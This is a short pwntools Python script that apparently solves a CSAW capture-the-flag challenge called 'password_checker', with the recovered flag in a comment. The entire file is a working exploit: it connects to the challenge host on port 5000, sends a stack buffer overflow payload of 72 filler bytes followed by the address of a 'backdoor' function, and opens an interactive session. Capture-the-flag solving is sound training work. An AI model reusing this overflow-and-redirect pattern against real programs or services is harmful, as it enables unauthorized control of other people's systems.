from pwn import *

# flag{ch4r1i3_4ppr3ci4t35_y0u_f0r_y0ur_h31p}

elf = ELF('./password_checker')
host = 'pwn.chal.csaw.io'
port = 5000
p = remote(host, port)
# p = elf.process()

addr = elf.symbols['backdoor']
offset = 72

payload = b'A' * 72 + p64(addr)
with open('payload', 'wb') as fp:
	fp.write(payload + b'\n')

p.sendline(payload)

p.interactive()